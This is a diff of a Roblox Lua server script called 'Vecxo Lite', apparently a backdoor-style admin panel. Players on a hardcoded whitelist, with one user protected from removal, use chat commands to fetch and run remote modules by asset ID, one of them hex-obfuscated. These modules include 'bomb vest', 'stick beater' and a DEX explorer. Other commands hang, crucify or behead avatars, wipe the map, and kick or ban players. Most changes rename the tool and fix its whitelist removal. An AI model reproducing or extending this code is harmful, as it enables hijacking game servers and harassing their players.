@@ -640,33 +640,32 @@ local function processCommand(sender, msg)
 	if not table.find(whitelisted, tostring(sender.UserId)) then return end
 	local args = msg:split(" ")
 	local cmd = args[1]:lower()
-
 	if cmd == "!wl" and args[2] then
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
 			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
-		for _, targetPlayer in ipairs(targets) do
+		for i, targetPlayer in ipairs(targets) do
 			if not table.find(whitelisted, tostring(targetPlayer.UserId)) then
 				table.insert(whitelisted, tostring(targetPlayer.UserId))
 			end
-			notifyv2(sender, "[Vecxo Lite]", "✅ Whitelisted " .. targetPlayer.Name)
+			notify(sender, "[Vecxo Lite]:", "✅ Whitelisted " .. targetPlayer.Name)
 			notifyv2(targetPlayer, "[Vecxo Lite]:", "✅ You have been whitelisted. Usage: !cmds")
 		end
 
 	elseif cmd == "!unwl" and args[2] then
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
 		for _, targetPlayer in ipairs(targets) do
 			if targetPlayer.Name ~= "Reloxz" then
-			table.insert(whitelisted, targetPlayer.UserId)
-				notify(sender, "[Vecxo Lite]", "✅ Removed " .. targetPlayer.Name .. " from whitelist")
+			table.remove(whitelisted, table.find(whitelisted, tostring(targetPlayer.UserId)))
+				notify(sender, "[Vecko Lite]: ", "✅ Removed " .. targetPlayer.Name .. " from whitelist")
 			else
-				notifyv2(sender, "[Vecxo Lite]", "❌ Protected user cannot be removed from the whitelist")
+				notifyv2(sender, "[Vecko Lite]: ", "❌ Protected user cannot be removed from the whitelist")
 			end
 		end
 	elseif cmd == "!shutdown" then
@@ -717,7 +716,7 @@ local function processCommand(sender, msg)
 				end
 			end
 		end
-		notifyv2(sender, "[Vecxo Lite]", "✅ The obby is hidden successfully")
+		notifyv2(sender, "[Vecko Lite]: ", "✅ The obby is hidden successfully")
 	elseif cmd == "!unhideobby" then
 		for i, v in pairs(game.workspace:GetDescendants()) do
 			if v.Name == "Tabby" then
@@ -734,7 +733,7 @@ local function processCommand(sender, msg)
 				end
 			end
 		end
-		notifyv2(sender, "[Vecxo Lite]", "✅ The obby is unhidden successfully")
+		notifyv2(sender, "[Vecko Lite]: ", "✅ The obby is unhidden successfully")
 	elseif cmd == "!clr" then
 		for _, v in pairs(game.Workspace:GetChildren()) do
 			if (v:IsA("Part") or v:IsA("TrussPart") or v:IsA("WedgePart")) and v.Parent == game.Workspace then
@@ -751,7 +750,7 @@ local function processCommand(sender, msg)
 				v:Destroy()
 			end
 		end
-		notifyv2(sender, "[Vecxo Lite]", "✅ Workspace cleared successfully")
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Workspace cleared successfully")
 	elseif cmd == "!backupmap" then
 		if mapBackup then mapBackup:ClearAllChildren() end
 
@@ -761,7 +760,7 @@ local function processCommand(sender, msg)
 				cloned.Parent = mapBackup
 			end
 		end
-		notifyv2(sender, "[Vecxo Lite]", "✅ Map has been backed up.")
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Map has been backed up.")
 	elseif cmd == "!restoremap" then
 		for _, item in ipairs(workspace:GetChildren()) do
 			if not item:IsA("Terrain") and not item:IsA("Camera") and not Players:GetPlayerFromCharacter(item) then
@@ -776,7 +775,7 @@ local function processCommand(sender, msg)
 		for i, v in pairs(game.Players:GetPlayers()) do
 			v:LoadCharacter()
 		end
-		notifyv2(sender, "[Vecxo Lite]", "✅ Map has been restored from backup.")
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Map has been restored from backup.")
 	elseif cmd == "!gobby" then
 		local basePos = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and sender.Character.HumanoidRootPart.Position or Vector3.new(0, 10, 0)
 		local spacing = 10
@@ -1091,7 +1090,7 @@ local function processCommand(sender, msg)
 		label.TextScaled = true
 		label.Parent = text
 
-		notifyv2(sender, "[Vecxo Lite]:", "Generated obby successfully")
+		notifyv2(sender, "[Vecko Lite]: :", "Generated obby successfully")
 
 		winPart.Touched:Connect(function(hit)
 			local player = game.Players:GetPlayerFromCharacter(hit.Parent)
@@ -1122,13 +1121,13 @@ local function processCommand(sender, msg)
 	elseif cmd == "!re" then
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
 		for _, targetPlayer in ipairs(targets) do
 			refreshPlayer(targetPlayer)
 		end
-		notifyv2(sender, "[Vecxo Lite]", "✅ Refreshed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
+		notifyv2(sender, "[Vecko Lite]: ", "✅ Refreshed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
 	elseif cmd == "!cmds" then
 		showCommandGui(sender)
 	elseif cmd == "!bans" then
@@ -1137,49 +1136,49 @@ local function processCommand(sender, msg)
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(5813743814).load(plr.Name)
-			notifyv2(sender, "[Vecxo Lite]", "✅ Ran stick beater on " ..plr.Name.." successfully")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran stick beater on " ..plr.Name.." successfully")
 		end
 	elseif cmd == "!knife" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(74444736936643)(plr.Name, "Grab Knife V1")
-			notifyv2(sender, "[Vecxo Lite]", "✅ Ran grab knife V1 on " ..plr.Name.." successfully")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran grab knife V1 on " ..plr.Name.." successfully")
 		end	
 	elseif cmd == "!magician" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(6438184104).load(plr.Name)
-			notifyv2(sender, "[Vecxo Lite]", "✅ Ran magician on " ..plr.Name.." successfully")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran magician on " ..plr.Name.." successfully")
 		end
 	elseif cmd == "!bombvest" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(0x49731b7f).load(plr.Name)
-			notifyv2(sender, "[Vecxo Lite]", "✅ Ran bomb vest on " ..plr.Name.." successfully")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran bomb vest on " ..plr.Name.." successfully")
 		end
 	elseif cmd == "!toolgun" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(14108404712).mingebag(plr.Name)
-			notifyv2(sender, "[Vecxo Lite]", "✅ Ran tool gun on " ..plr.Name.." successfully")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran tool gun on " ..plr.Name.." successfully")
 		end
 	elseif cmd == "!dex" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(12146718110):Fire(plr.Name)
-			notifyv2(sender, "[Vecxo Lite]", "✅ Ran DEX explorer on " ..plr.Name.." successfully")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Ran DEX explorer on " ..plr.Name.." successfully")
 		end
 	elseif cmd == "!gentk" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(5430831931).Dark(plr.Name)
-			notifyv2(sender, "[Vecxo Lite]", "✅ Gentleman's killer ran on " ..plr.Name.." successfully")
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Gentleman's killer ran on " ..plr.Name.." successfully")
 		end
 	elseif cmd == "!hang" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then
-				notifyv2(sender, "[Vecxo Lite]", "✅ Hanging "..plr.Name.."...")
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Hanging "..plr.Name.."...")
 				local function createPart(cf, size, material, color)
 					local p = Instance.new("Part")
 					p.Name = "cxo was here"
@@ -1224,14 +1223,14 @@ local function processCommand(sender, msg)
 	elseif cmd == "!crucify" then
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
 
 		for _, plr in ipairs(targets) do
 			coroutine.wrap(function()
 				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-					notifyv2(sender, "[Vecxo Lite]", "✅ Crucifying "..plr.Name.."...")
+					notifyv2(sender, "[Vecko Lite]: ", "✅ Crucifying "..plr.Name.."...")
 					local character = plr.Character
 					local rootPart = character.HumanoidRootPart
 					local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -1332,7 +1331,7 @@ local function processCommand(sender, msg)
 		local targetName = args[2]:lower()
 		for _, plr in ipairs(Players:GetPlayers()) do
 			if plr.Name:lower():sub(1, #targetName) == targetName then
-				notifyv2(sender, "[Vecxo Lite]", "✅ Beheading "..plr.Name.."...")
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Beheading "..plr.Name.."...")
 				local character = plr.Character
 				if not character then return end
 
@@ -1445,16 +1444,16 @@ local function processCommand(sender, msg)
 		local reason = msg:match("^!kick%s+%S+%s+(.+)$")
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
+			notifyv2(sender, "[Vecko Lite]: ", "Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
 		for _, targetPlayer in ipairs(targets) do
 			if reason then
-				targetPlayer:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
-				notifyv2(sender, "[Vecxo Lite]", "✅ Kicked " .. targetPlayer.Name)
+				targetPlayer:Kick("[Vecko Lite]: : Kicked by " .. sender.Name .. ": " .. reason)
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Kicked " .. targetPlayer.Name)
 			else
 				targetPlayer:Destroy()
-				notifyv2(sender, "[Vecxo Lite]", "✅ Kicked " .. targetPlayer.Name)
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Kicked " .. targetPlayer.Name)
 			end
 		end
 	elseif cmd == "!unban" and args[2] then
@@ -1470,9 +1469,9 @@ local function processCommand(sender, msg)
 
 		if bannedPlayers[plrid] then
 			bannedPlayers[plrid] = nil
-			notifyv2(sender, "[Vecxo Lite]","✅ ".. plr .. " has been unbanned successfully.")
+			notifyv2(sender, "[Vecko Lite]: ","✅ ".. plr .. " has been unbanned successfully.")
 		else
-			notifyv2(sender, "[Vecxo Lite]","❌ ".. plr .. " is not currently banned.")
+			notifyv2(sender, "[Vecko Lite]: ","❌ ".. plr .. " is not currently banned.")
 		end
 
 
@@ -1480,7 +1479,7 @@ local function processCommand(sender, msg)
 		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
 		for _, targetPlayer in ipairs(targets) do
@@ -1491,27 +1490,27 @@ local function processCommand(sender, msg)
 			else
 				bannedPlayers[targetPlayer.UserId] = true
 				targetPlayer:Destroy()
-				notifyv2(sender, "[Vecxo Lite]", "✅ Banned " .. targetPlayer.Name)
+				notifyv2(sender, "[Vecko Lite]: ", "✅ Banned " .. targetPlayer.Name)
 			end
 		end
 	elseif cmd == "!rj" then
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
-			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
+			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
 			return
 		end
 		local TeleportService = game:GetService("TeleportService")
 		local placeId = game.PlaceId
 		local jobId = game.JobId
 		for _, targetPlayer in ipairs(targets) do
-			notifyv2(sender, "[Vecxo Lite]", "✅ Rejoining " .. targetPlayer.DisplayName)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Rejoining " .. targetPlayer.DisplayName)
 			TeleportService:TeleportToPlaceInstance(placeId, jobId, targetPlayer)
 		end
 
 	elseif cmd == "!h" then
 		local announcement = msg:sub(4)
 		for _, plr in ipairs(Players:GetPlayers()) do
-			notify(plr, "[Vecxo Lite]", announcement)
+			notify(plr, "[Vecko Lite]: ", announcement)
 		end
 	end
 end
